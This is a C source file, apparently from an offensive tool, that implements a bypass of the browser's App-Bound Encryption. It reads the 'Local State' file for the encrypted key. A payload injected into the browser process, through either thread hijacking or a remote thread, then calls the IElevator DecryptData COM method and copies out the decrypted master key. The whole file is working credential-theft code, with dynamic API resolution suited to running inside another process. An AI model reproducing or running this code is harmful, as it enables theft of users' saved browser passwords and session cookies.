#include "AbeDecrypt.h"

/*** data shared with the in-browser payload ***/

#pragma data_seg(".abedata")
__declspec(allocate(".abedata"))
volatile LONG g_Pending = 0;
__declspec(allocate(".abedata"))
volatile LONG g_Code = (LONG)E_FAIL;
__declspec(allocate(".abedata"))
volatile BYTE g_Key[ABE_KEY_SIZE];
#pragma data_seg()

/* request block patched into the mapped image before injection */
#pragma data_seg(".abereq")
__declspec(allocate(".abereq"))
volatile ABE_REQUEST g_Request = { 0 };
#pragma data_seg()

/* prepares the request block scanned by the payload (raw Local State text) */
BOOL
AbePrepareRequest(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex)
{
    PVOID Text;
    ULONG TextLength = 0;
    WCHAR LocalState[MAX_PATH];
    BOOL Ok = FALSE;

    Text = Mem_Alloc(ABE_LOCAL_STATE_MAX);
    if (Text == NULL) return FALSE;
    Str_PrintfExW(LocalState, MAX_PATH, L"%ls\\Local State", Browser->UserDataDir);
    if (NT_SUCCESS(AbeReadWholeFile(LocalState, Text, ABE_LOCAL_STATE_MAX, &TextLength)) &&
        TextLength < ABE_LOCAL_STATE_MAX)
    {
        RtlCopyMemory((PVOID)g_Request.LocalState, Text, TextLength);
        g_Request.BrowserIndex = BrowserIndex;
        g_Request.LocalStateLength = TextLength;
        Ok = TRUE;
    }
    Mem_Free(Text);
    return Ok;
}

/*** payload: runs inside the browser process ***/

/* IElevator::DecryptData vtable slot signature */
typedef HRESULT (WINAPI *PFN_IELEVATOR_DECRYPT_DATA)(PVOID This, BSTR In, BSTR* Out, DWORD* LastError);

VOID
AbePayloadWorker(VOID)
{
    static BYTE Blob[2048];
    const ABE_BROWSER* Browser = NULL;
    typeof(&CoInitializeEx) CoInit;
    typeof(&CoCreateInstance) CoCreate;
    typeof(&CoSetProxyBlanket) CoBlanket;
    typeof(&SysAllocStringByteLen) SysAllocByteLen;
    typeof(&SysStringByteLen) SysByteLen;
    typeof(&SysFreeString) SysFree;
    typeof(&CryptStringToBinaryA) CryptStrToBin;
    PVOID Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    DWORD LastError = 0, Base64Length = 0, BlobLength = sizeof(Blob);
    ULONG Index, TagLength = sizeof("\"app_bound_encrypted_key\":\"") - 1;
    PCSTR Base64 = NULL;
    LONG Code = (LONG)E_FAIL;
    HRESULT Hr = E_FAIL;
    BYTE* Text = (BYTE*)g_Request.LocalState;

    /* runs before CRT init in the remote image: everything must be resolved dynamically */
    if (g_Request.BrowserIndex < ARRAYSIZE(AbeBrowsers))
        Browser = &AbeBrowsers[g_Request.BrowserIndex];

    for (Index = 0; Browser && Index + TagLength <= g_Request.LocalStateLength; Index++)
    {
        if (Text[Index] == '"' &&
            memcmp(Text + Index, "\"app_bound_encrypted_key\":\"", TagLength) == 0)
        {
            Base64 = (PCSTR)Text + Index + TagLength;
            break;
        }
    }
    if (Base64)
    {
        while (Base64Length < 8192 && Base64[Base64Length] != '"') Base64Length++;
    }

    CryptStrToBin = (typeof(CryptStrToBin))GetProcAddress(LoadLibraryW(L"crypt32.dll"),
                                                          "CryptStringToBinaryA");
    if (Base64 && CryptStrToBin &&
        CryptStrToBin(Base64,
                      Base64Length,
                      CRYPT_STRING_BASE64,
                      Blob,
                      &BlobLength,
                      NULL,
                      NULL) &&
        BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0 &&
        (CoInit = (typeof(CoInit))GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
        (CoCreate = (typeof(CoCreate))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
        (CoBlanket = (typeof(CoBlanket))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
        (SysAllocByteLen = (typeof(SysAllocByteLen))GetProcAddress(LoadLibraryW(L"oleaut32.dll"),
                                                                   "SysAllocStringByteLen")) != NULL &&
        (SysByteLen = (typeof(SysByteLen))GetProcAddress(GetModuleHandleW(L"oleaut32.dll"),
                                                         "SysStringByteLen")) != NULL &&
        (SysFree = (typeof(SysFree))GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
    {
        Hr = CoInit(NULL, COINIT_APARTMENTTHREADED);
        if (SUCCEEDED(Hr))
        {
            Hr = CoCreate(&Browser->Clsid,
                          NULL,
                          CLSCTX_LOCAL_SERVER,
                          &Browser->Iid,
                          &Elevator);
            if (SUCCEEDED(Hr))
            {
                Hr = CoBlanket(Elevator,
                               RPC_C_AUTHN_DEFAULT,
                               RPC_C_AUTHZ_DEFAULT,
                               NULL,
                               RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                               RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL,
                               EOAC_DYNAMIC_CLOAKING);
                if (SUCCEEDED(Hr))
                {
                    In = SysAllocByteLen((PCSTR)Blob + 4, BlobLength - 4);
                    Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                        Elevator,
                        In,
                        &Out,
                        &LastError);
                    if (SUCCEEDED(Hr) && Out && SysByteLen(Out) == ABE_KEY_SIZE)
                    {
                        RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
                        Code = 0;
                    }
                }
            }
        }
    }
    g_Code = Code != 0 ? (LONG)Hr : 0;
    g_Pending = 1;
}

/* Hijack entry: zero-arg, parks until reaped */
VOID
AbeHijackEntry(VOID)
{
    AbePayloadWorker();
    for (;;)
    {
        PS_DelayExec(INFINITE);
    }
}

/* Inject entry: thread-proc signature, returns so the remote thread can exit */
DWORD WINAPI
AbeInjectEntry(LPVOID Param)
{
    UNREFERENCED_PARAMETER(Param);
    AbePayloadWorker();
    return 0;
}
